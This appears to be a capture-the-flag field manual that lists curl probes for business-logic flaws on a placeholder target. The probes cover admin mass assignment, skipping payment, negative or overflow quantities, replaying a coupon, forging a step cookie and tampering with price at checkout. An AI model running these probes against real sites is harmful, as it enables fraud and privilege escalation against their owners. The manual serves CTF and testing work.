# Field manual — the business-logic sweep, as run on a live target

The checklist version is `workflow-checklist.md`. This is the field
version — the commands in order, with the response reading at each step.
`$BASE` is the target, `$JAR` the cookie jar.

## 0. Setup

```bash
export BASE=https://target.example
export JAR=/tmp/jar.txt
python3 tools/state.py mychal --category web --target $BASE \
  --challenge-name "My Chal" --event "CTF 2025"
python3 tools/web/bundle_miner.py --url $BASE/static/app.js --out /tmp/bundle
```

## 1. The field map

```bash
curl -s -b "$JAR" $BASE/api/user/me | jq .
```

Every field in the response is a mass-assignment candidate. `role`,
`balance`, `verified`, `permissions`, `plan`, `flags` are the privileged
ones — but ANY field the register form doesn't send is a probe.

## 2. Happy-path baseline

```bash
curl -i -c "$JAR" -X POST $BASE/register -d 'u=p&p=x'      > b_reg.txt
curl -i -b "$JAR" -X POST $BASE/cart -d 'productId=2&qty=1' > b_cart.txt
curl -i -b "$JAR" -X POST $BASE/checkout                   > b_chk.txt
curl -i -b "$JAR" $BASE/order/1                            > b_ord.txt
```

Save all four. The diffs need them.

## 3. Mass assignment

```bash
curl -s -c "$JAR" -X POST $BASE/register -H "Content-Type: application/json" \
  -d '{"username":"p2","password":"x","role":"admin"}' | tee r_ma.txt
curl -s -b "$JAR" $BASE/api/user/p2 | jq .role
```

- `admin` → CONFIRM → `GET /admin`, enumerate role-gated routes.
- `user` or `400` → falsifier → next mechanism, not next spelling.
- If `register` falsified, `PATCH /profile` or `PUT /users/me` is a
  DIFFERENT binder — one probe there is legitimate.

## 4. Workflow skip

```bash
curl -i -b "$JAR" -X POST $BASE/confirm -d 'orderId=1' > r_skip.txt
curl -s -b "$JAR" $BASE/order/1 | jq '{status, charged, paid}'
```

- `confirmed` + `charged:0`/`paid:false` → CONFIRM.
- `302`/`400` → falsifier → find where state lives:
  ```bash
  # cookie-carried?
  grep -o 'step=[0-9]*' /tmp/bundle/sources/* 2>/dev/null
  # then forge it: --cookie "step=3" or param step=3
  ```

## 5. Numeric boundary

```bash
for v in -1 0 0.1 1e309 NaN 2147483648 0x10; do
  echo "== $v"; curl -s -b "$JAR" -X POST $BASE/cart \
    -d "productId=2&quantity=$v" | jq -c '{total, status}'
done
```

- any `total` negative/zero/NaN/Infinity that proceeds → CONFIRM.
- then repeat on `price`, `discount`, `amount` fields — a rejected
  `quantity` says nothing about them.

## 6. State replay

```bash
curl -s -b "$JAR" $BASE/balance | jq .balance   # before
curl -s -b "$JAR" -X POST $BASE/redeem -d 'code=SAVE50'
curl -s -b "$JAR" $BASE/balance | jq .balance   # after1
curl -s -b "$JAR" -X POST $BASE/redeem -d 'code=SAVE50'
curl -s -b "$JAR" $BASE/balance | jq .balance   # after2
```

- +50 then +50 → CONFIRM.
- `409` second → falsifier → parallel window is race's question.

## 7. Transform check (Pachinko shape)

```bash
# a) valid per docs
curl -i -b "$JAR" -X POST $BASE/api/check -d 'id=99'    > r_ok.txt
# b) just past documented limit
curl -i -b "$JAR" -X POST $BASE/api/check -d 'id=101'   > r_past.txt
# c) malformed
curl -i -b "$JAR" -X POST $BASE/api/check -d 'id=abc'   > r_mal.txt
diff <(jq -S . r_past.txt) <(jq -S . r_mal.txt)
```

- past-limit ≠ malformed rejection → different layer → the transform
  ran → CONFIRM the gap → solve the wrap.
- identical → falsifier.

## 8. Trust-in-earlier-step

```bash
# step1 mints {"price":50}; resubmit mutated at step3
curl -i -b "$JAR" -X POST $BASE/order -d 'orderId=1&price=1' > r_trust.txt
curl -s -b "$JAR" $BASE/order/1 | jq .charged
```

- `charged:1` → CONFIRM. `400 price mismatch` → falsifier.

## 9. Record everything

```bash
python3 tools/hooks.py post-probe mychal \
  --request "POST /register role=admin" --verdict confirms \
  --class web-logic-flaw --hypothesis-id h1 \
  --evidence-kind class --evidence '"role":"admin"' \
  --response "$(cat r_ma.txt)"
```

Every row above gets a `post-probe` — confirm, falsified, or negative.

## 10. Chain or escalate

Confirm → walk the new edge toward `/flag`. All falsifiers →
`python3 tools/decide.py mychal` — it names the next rung
(`writeup_search`, `novel_plan`, `fanout_sweep`), never a sixth
spelling variant.
